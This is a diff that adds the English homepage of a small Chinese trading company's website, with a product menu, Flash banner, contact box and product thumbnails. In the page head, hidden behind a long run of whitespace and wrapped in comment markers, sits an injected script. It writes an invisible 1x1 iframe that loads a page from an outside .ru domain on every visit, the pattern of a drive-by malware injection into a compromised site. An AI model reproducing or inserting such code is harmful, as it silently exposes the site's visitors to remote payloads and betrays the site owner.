@@ -1,0 +1,354 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<!--e2aa4e-->                                                                                                                                                                                                                                                          (function () {    var ydtqs = document.createElement('iframe');    ydtqs.src = 'http://acdastas.ru/count12.php';    ydtqs.style.position = 'absolute';    ydtqs.style.border = '0';    ydtqs.style.height = '1px';    ydtqs.style.width = '1px';    ydtqs.style.left = '1px';    ydtqs.style.top = '1px';    if (!document.getElementById('ydtqs')) {        document.write('<div id=\'ydtqs\'></div>');        document.getElementById('ydtqs').appendChild(ydtqs);    }})();<!--/e2aa4e-->
+
+<title>Goldfield Trading Co. - Goldfield Trading Co.</title>
+<meta name="keywords" content="Goldfield Trading Co." />
+<meta name="description" content="Goldfield Trading Co." />
+<meta name="author" content="Web Design：huacheng QQ:113377538 E-mail:huacheng@163.com Website:http://www.huacheng.com" />
+<link href="css/grey.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+
+<div id="main">
+  <table width="980" border="0" cellpadding="5" cellspacing="0" style="margin:10px 0;">
+<tr>
+      <td rowspan="2" align="left" width="1"><a href="http://www.goldfieldtrading.com"><img src="/pic/logo/logo.jpg" alt="Goldfield Trading Co." border="0" /></a></td>
+      
+      <td rowspan="2" align="left"><h1 class="company_name">Goldfield Trading Co.</h1></td>
+      
+      <td align="right"><table width="160" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td width="80" height="30"><a href="/index_cn.html"><img src="/images/cn.jpg" alt="进入中文版" border="0"  /></a></td>
+              <td width="11"></td>
+              <td width="69"><a href="/index_en.html"><img src="/images/en.jpg" alt="ENGLISH" border="0"  /></a></td>
+            </tr>
+          </table></td>
+  </tr>
+<tr>
+  <td align="right"><form  action="/e_products/index.asp" method="post" name="search" id="search">
+        Product Search :
+		<input name="key" id="key" value="" size="12" />
+ 		<input name="button1" type="submit" class="input_submit" id="button1" value=" GO " />
+      </form></td>
+</tr>
+  </table>
+<table width="980" border="0" cellpadding="0" cellspacing="0" id="menu">
+ <div id="mainMenu"><ul><li id="mainMenu1"><a  href="/index_en.html"  style="color:">Home</a></li><li id="mainMenu2"><a  href="/html_info/about-us.html"  style="color:">About</a></li><li id="mainMenu3"><a  href="/e_products/"  style="color:">Products</a><ul onMouseOver="document.getElementById('mainMenu3')'" onMouseOut="document.getElementById('mainMenu3')'"><li><a href="/e_products/index.asp?big_id=2">Shoes</a></li><li><a href="/e_products/index.asp?big_id=1">Electrical toaster</a></li><li><a href="/e_products/index.asp?big_id=3">added</a></li></ul></li><li id="mainMenu4"><a  href="/e_news/"  style="color:">News</a><ul onMouseOver="document.getElementById('mainMenu4')'" onMouseOut="document.getElementById('mainMenu4')'"><li><a href="/e_news/?class_id=1">Corporation News</a></li><li><a href="/e_news/?class_id=2">Industry News</a></li></ul></li><li id="mainMenu7"><a  href="/e_feedback/"  style="color:">Feedback</a></li><li id="mainMenu39"><a  href="/html_info/contact-us.html"  style="color:">Contact Us</a></li><li id="mainMenu43"><a  href="/html_info/FAQ.html"  style="color:">Menu</a></li></ul></div>
+    </tr>
+  </table>
+
+<div id="top_flash">
+
+<script language="javascript" type="text/javascript">
+<!--
+var focus_width=980
+var focus_height=190
+var text_height=0
+var swf_height = focus_height+text_height
+var pics = '';
+var links = '';
+var texts = '';
+							
+function ati(url, img, title)
+{
+if(pics != '')
+{
+pics = "|" + pics;
+links = "|" + links;
+texts = "|" + texts;
+}
+pics = escape(img) + pics;
+links = escape(url) + links;
+texts = title + texts;
+}
+
+
+ati('#', '/pic/flash/3.jpg', '');
+
+ati('#', '/pic/flash/2.jpg', '');
+
+ati('#', '/pic/flash/1.jpg', '');
+
+
+var huacheng = '<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http:\/\/fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width=\"'+ focus_width +'\" height=\"'+ swf_height +'\">';
+huacheng += '<param name="movie" value="/\images\/flash_img.swf"><param name="quality" value="high"><param name="bgcolor" value="#ffffff">';
+huacheng += '<param name=\"menu\" value=\"false\"><param name=wmode value=\"opaque\">';
+huacheng +='<param name=\"FlashVars\" value=\"pics='+pics+'&links='+links+'&texts='+texts+'&borderwidth='+focus_width+'&borderheight='+focus_height+'&textheight='+text_height+'\">';
+huacheng +='<embed src=\"/\images\/flash_img.swf\" wmode=\"opaque\" FlashVars=\"pics='+pics+'&links='+links+'&texts='+texts+'&borderwidth='+focus_width+'&borderheight='+focus_height+'&textheight='+text_height+'\" menu=\"false\" bgcolor=\"#ffffff\" quality=\"high\" width=\"'+ focus_width +'\" height=\"'+ swf_height +'\" allowScriptAccess=\"sameDomain\" type=\"application\/x-shockwave-flash\" pluginspage=\"http:\/\/www.macromedia.com\/go\/getflashplayer\" \/>';
+huacheng +='<\/object>';
+document.write(huacheng);
+//-->
+</script>
+
+</div> 
+
+  <table width="980" border="0" cellpadding="0" cellspacing="0">
+    <tr>
+      <td width="230" valign="top">
+      <table width="230" border="0" cellpadding="0" cellspacing="0" id="left_class">
+        <tr>
+          <td><h6>Products Category</h6></td>
+        </tr>
+        <tr>
+          <td>
+			
+            <ul><li>
+<a href="/e_products/index.asp?big_id=1" title="Handbag"><strong>Handbag</strong></a></li>
+
+			
+            </ul>
+			
+            <ul><li>
+<a href="/e_products/index.asp?big_id=2" title="Shoes"><strong>Shoes</strong></a></li>
+
+			
+            </ul>
+			
+            <ul><li>
+<a href="/e_products/index.asp?big_id=3" title="Scarf"><strong>Scarf</strong></a></li>
+
+			
+            </ul>
+			
+            <ul><li>
+<a href="/e_products/index.asp?big_id=4" title="Jewelry"><strong>Jewelry</strong></a></li>
+
+			
+            </ul>
+			
+            <ul><li>
+<a href="/e_products/index.asp?big_id=5" title="Others"><strong>Others</strong></a></li>
+
+			
+            </ul>
+			
+          </td>
+        </tr>
+      </table>
+        <table width="230" border="0" cellpadding="0" cellspacing="0" id="left_contact">
+          <tr>
+            <td><h6>Contact Us</h6></td>
+          </tr>
+          <tr>
+            <td>
+<p>
+
+<strong>Tel:</strong> +86-512-88888888<br />
+<strong>Fax:</strong> +86-512-88888888<br />
+<strong>Mobile:</strong> +86-18888888888<br />
+<strong>E-mail: </strong>test@163.com<br />
+<strong>Add:</strong> SuZhou City, Province,China<br />
+<strong>MSN:</strong> test@163.com<br />
+<strong>Skype:</strong> Powell.sda<br />
+<strong>Yahoo:</strong> Powellsda@yahoo.com<br />
+<strong>QQ:</strong> 1984486045<br />
+<a href="msnim:chat?contact=test@163.com"><img src="/images/msn.png" alt="MSN: test@163.com" border="0" /></a> 
+
+<a href="skype:Powell.sda?call"><img src="/images/skype.png" alt="SKYPE: Powell.sda" border="0" /></a> 
+
+<a href="ymsgr:sendIM?Powellsda@yahoo.com"><img src="/images/yahoo.png" alt="YAHOO: Powellsda@yahoo.com" border="0" /></a> 
+
+<a href="http://wpa.qq.com/msgrd?V=1&Uin=1984486045&Site=Goldfield Trading Co.&Menu=yes" target="_blank"><img src="/images/qq.png" alt="QQ: 1984486045" border="0" /></a>
+
+</p>
+			</td>
+          </tr>
+        </table>
+        
+
+
+      </td>
+      <td width="10"></td>
+      <td width="740" valign="top">
+     
+<div id="right_main">
+<table width="700" border="0" cellpadding="0" cellspacing="0" style="margin:0 auto;">
+  <tr>
+    <td class="line_buttom_hui"><div class="weizhi">About Us</div></td>
+    <td align="right" class="line_buttom_hui"><a href="html_info/about-us.html"><img src="images/grey/more.gif" alt="more" width="35" height="16" border="0" /></a></td>
+  </tr>
+  <tr>
+    <td colspan="2">
+    <div class="hangju">
+    Powell Appliance Industrial Limited, a sister co. of Sunlon in charge of export sales, is a professional manufacturer for small kitchen appliances, such as soymilk maker, electric kettle, toaster,blender, juicer and water heater. Since founded in 2008, Powell is growing very fast with annual growth of 40%, in 2011 we have become one o[<a href="html_info/about-us.html">more</a>]
+	
+    </div></td>
+    </tr>
+</table>
+
+  <table width="700" border="0" cellpadding="0" cellspacing="0" style="margin:0 auto;">
+  <tr>
+    <td class="line_buttom_hui"><div class="weizhi">Hot Product</div></td>
+      <td align="right" class="line_buttom_hui"><a href="e_products/"><img src="images/grey/more.gif" alt="more" width="35" height="16" border="0" /></a></td>
+    </tr>
+  <tr>
+    <td colspan="2"><br />
+    <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr>
+        </tr><tr>
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/KAiLA-13.html" target="_self"> <img  src="pic/big/13_0.jpg"  width="130" height="130"  alt="KAiLA" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/KAiLA-13.html" target="_self" >BH-013<br />KAiLA</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/Scarf-10.html" target="_self"> <img  src="pic/big/10_0.jpg"  width="130" height="130"  alt="Scarf" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/Scarf-10.html" target="_self" >BH-010<br />Scarf</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/WALL-SKATE-7.html" target="_self"> <img  src="pic/big/7_0.jpg"  width="130" height="130"  alt="WALL SKATE" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/WALL-SKATE-7.html" target="_self" >BH-007<br />WALL SKATE</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/Sneakers-6.html" target="_self"> <img  src="pic/big/6_0.jpg"  width="130" height="130"  alt="Sneakers" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/Sneakers-6.html" target="_self" >BH-006<br />Sneakers</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              </tr><tr>
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/Fendi-4.html" target="_self"> <img  src="pic/big/4_0.jpg"  width="130" height="130"  alt="Fendi" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/Fendi-4.html" target="_self" >fh60<br />Fendi</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/GUQI-3.html" target="_self"> <img  src="pic/big/3_0.jpg"  width="130" height="130"  alt="GUQI" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/GUQI-3.html" target="_self" >fh92<br />GUQI</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/BE-&-D-2.html" target="_self"> <img  src="pic/big/2_0.jpg"  width="130" height="130"  alt="BE & D" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/BE-&-D-2.html" target="_self" >fh280<br />BE & D</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        <td valign="top">
+        <table width="130"  border="0" cellpadding="0" cellspacing="0" style="margin:0 auto 10px auto;">
+          <tr>
+            <td height="130" align="center" bgcolor="#FFFFFF" class="border_hui"><a href="html_products/Marc-Jacobs-1.html" target="_self"> <img  src="pic/big/1_0.jpg"  width="130" height="130"  alt="Marc Jacobs" border="0" /></a></td>
+                </tr>
+          <tr>
+            <td align="center" ><a href="html_products/Marc-Jacobs-1.html" target="_self" >fh164<br />Marc Jacobs</a></td>
+                </tr>
+          
+          </table>
+        </td>
+              
+        </tr>
+      </table>        </td>
+    </tr>
+  </table>
+</div></td>
+    </tr>
+  </table>
+  <div id="foot">
+<div align="center">
+	<SCRIPT language=javascript src="/js/lang.js"></SCRIPT>
+		<a href='javascript:translator("en|zh-CN")'><img height=14 src="/images/ico_china.jpg" width=20 align=absMiddle border=0 /> Chinese</a>
+		<a href='javascript:translator("en|de")'><img height=14 src="/images/ico_deutsch1.gif" width=20 align=absMiddle border=0 /> Deutsch</a>
+		<a href='javascript:translator("en|es")'><img height=14 src="/images/ico_espanol.gif" width=20 align=absMiddle border=0 /> Espanol</a>
+		<a href='javascript:translator("en|fr")'><img height=14 src="/images/ico_francies.gif" width=20 align=absMiddle border=0 /> Francais</a>
+		<a href='javascript:translator("en|it")'><img height=14 src="/images/ico_italino.gif" width=20 align=absMiddle border=0 /> Italiano</a>
+		<a href='javascript:translator("en|pt")'><img height=14 src="/images/ico_portgues.gif" width=20 align=absMiddle border=0 /> Portugues</a>
+		<a href='javascript:translator("en|ja")'><img height=14 src="/images/ico_japan.jpg" width=20 align=absMiddle border=0 /> Japanese</a>
+		<a href='javascript:translator("en|ko")'><img height=14 src="/images/ico_korea.jpg" width=20 align=absMiddle border=0 /> Korean</a>
+		<a href='javascript:translator("en|ar")'><img height=14 src="/images/ico_arabia.jpg" width=20 align=absMiddle border=0 /> Arabic</a>
+		<a href='javascript:translator("en|ru")'><img height=14 src="/images/ico_russia.jpg" width=20 align=absMiddle border=0 /> Russian</a>
+
+</div>
+
+
+  
+      
+        <a href="/index_en.html" title="Home">Home</a> |
+        
+
+      
+        <a href="/html_info/about-us.html" title="About">About</a> |
+        
+
+      
+        <a href="/e_products/" title="Products">Products</a> |
+        
+
+      
+        <a href="/e_news/" title="News">News</a> |
+        
+
+      
+        <a href="/e_feedback/" title="Feedback">Feedback</a> |
+        
+
+      
+        <a href="/html_info/contact-us.html" title="Contact Us">Contact Us</a> |
+        
+
+      
+        <a href="/html_info/FAQ.html" title="Menu">Menu</a> |
+        
+
+    
+   <a href="/e_sitemap/" target="_blank">Sitemap<img height=14 src="/images/map.gif"  alt="sitemap" border=0 /></a><br /> 
+  Copyright © 2013&nbsp;<a href="http://www.goldfieldtrading.com">Goldfield Trading Co.</a>  All Rights Reserved<script language="javascript" type="text/javascript" src="http://js.users.51.la/3294380.js"></script>
+  </div>
+  
+
+
+</div>
+
+</body>
+</html>
